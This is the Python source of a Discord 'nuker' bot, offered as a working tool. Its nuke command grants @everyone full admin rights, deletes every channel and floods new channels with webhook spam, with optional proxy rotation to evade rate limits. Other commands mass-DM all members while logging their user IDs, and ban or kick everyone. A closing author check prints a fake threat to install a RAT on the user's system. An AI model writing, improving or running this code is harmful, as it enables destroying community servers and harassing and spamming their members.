import asyncio
import discord
from discord import Permissions
from discord.ext import commands
from util.proxies import proxy_scrape, proxy
import os
import random
import threading
import time
import requests
from pystyle import *
import sys
import json

__author__ = 'K.Dot#0001'
__version__ = '1.0.0'

with open('config.json', 'r') as f:
    config = json.load(f)
    TOKEN = config["TOKEN"]
    CHANNEL_NAMES = config["CHANNEL_NAMES"]
    MESSAGE = config["MESSAGE"]
    PREFIX = config["PREFIX"]
    AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
    SERVER_NAME = config["SERVER_NAME"]
    SPAM_PRN = config["SPAM_PRN"]
    PROXIES = config["PROXIES"]
    LESS_RATE_LIMIT = config["LESS_RATE_LIMIT"]



banner = Center.XCenter("""
 ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗
██║  ███╗██║   ██║██║  ██║█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝
██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
╚██████╔╝╚██████╔╝██████╔╝██║     ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
 ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 Made by Godfather and K.Dot#0001\n\n
""")


intents = discord.Intents.all() #enable all intents cause why not
client = commands.Bot(command_prefix=PREFIX, intents=intents) #I fucking love intents
client.remove_command('help') #help can smd

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name='K.Dot#0001'))
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("title " + "Nuking with K.Dot#0001")
    print(Colorate.Vertical(Colors.purple_to_red, banner, 2))
    print(Colors.green + f"READY FOR NUKING\n\nSAY '{PREFIX}help' FOR HELP\n")


@client.command()
async def nuke(ctx):
    try:
        await ctx.message.delete()
        await ctx.guild.edit(name=str(SERVER_NAME))
        try:
            role = discord.utils.get(ctx.guild.roles, name = "@everyone")
            await role.edit(permissions = Permissions.all())
        except:
            print("couldn't give everyone admin")
        #for role in ctx.guild.roles:
        #    try:
        #        await role.delete()
        #    except:
        #        print(f"couldn't delete {role}")
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                print("a")
        for i in range(int(AMMOUNT_OF_CHANNELS)):
            try:
                kdot = await ctx.guild.create_text_channel(name='K.Dot#0001')
                webhook = await kdot.create_webhook(name='K.Dot#0001')
                threading.Thread(target=spamhook, args=(webhook.url,)).start()
            except:
                print('There was an error while creating channels')
    except:
        print("b")

@client.command()
async def massdm(ctx):
    await ctx.message.delete() #aint nobody wanna see ur message
    for user in ctx.guild.members: #for every member in the server
        try: #just try it 
            #num = randint(1, 2) #makes disocrd not lick ur weiner (sometimes)
            await user.send(MESSAGE) #sends dm
            #asyncio.wait(num) #wait for num seconds
            print(f"Dm'd {user.name}") #print who we dm
            with open ('scrape.txt', 'a') as f: #open scrape.txt
                f.write(str(user.id) + '\n') #write user id to scrape.txt
        except: #if it fails
            print(f"Couldn't dm {user.name}") #no dm 4 u

@client.command()
async def ban_all(ctx): #will rate limit the bot
    try:
        for member in ctx.guild.members:
            try:
                await member.ban(reason= 'Banned by K.Dot#0001')
                print(f'Banned {member.name}')
                asyncio.wait(.5)
            except:
                print(f'Failed to ban {member.name}')
    except:
        print('No more people to ban!')

@client.command()
async def kick_all(ctx): #will rate limit the bot
    try:
        for member in ctx.guild.members:
            await member.kick(reason= 'Kicked by K.Dot#0001')
            print(f'Kicked {member.name}')
            asyncio.wait(.5)
    except:
        print(f'Failed to kick {member.name}')
        
@client.command()
async def help(ctx):
    embedVar = discord.Embed(title="Help Menu!", color=0x00ff00)
    embedVar.set_thumbnail(url='https://cdn.discordapp.com/attachments/996976015970676910/1012856993561718795/damn_cover.jpg?size=4096')
    embedVar.add_field(name="Instructions", value=f'''
Different Help commands

{PREFIX} nuke
{PREFIX} ban_all
{PREFIX} kick_all
{PREFIX} massdm

''', inline=True)
    embedVar.set_footer(text = 'Made by K.Dot#0001')
    await ctx.send(embed=embedVar)

def spamhookp(hook):
    for i in range(5):
        for i in range(4):
            if SPAM_PRN == True:
                try:
                    requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))}, proxies=proxy())
                except:
                    print(f'error spamming! {hook}')
            else:
                try:
                    requests.post(hook, data={'content': MESSAGE}, proxies=proxy())
                except:
                    print(f'error spamming! {hook}')
            if LESS_RATE_LIMIT == False:
                continue
            else:
                time.sleep(0.2)
    sys.exit()
        
def spamhook(hook):
    for i in range(5):
        for i in range(4):
            if SPAM_PRN == True:
                try:
                    requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))})
                except:
                    print(f'error spamming! {hook}')
            else:
                try:
                    requests.post(hook, data={'content': MESSAGE})
                except:
                    print(f'error spamming! {hook}')
            if LESS_RATE_LIMIT == False:
                continue
            else:
                time.sleep(0.2)
    sys.exit()

if PROXIES == True:
    proxy_scrape()

if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
    print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
    time.sleep(5)
    os._exit(0)

try:
    client.run(TOKEN)
except:
    print('Invalid Token or other error')
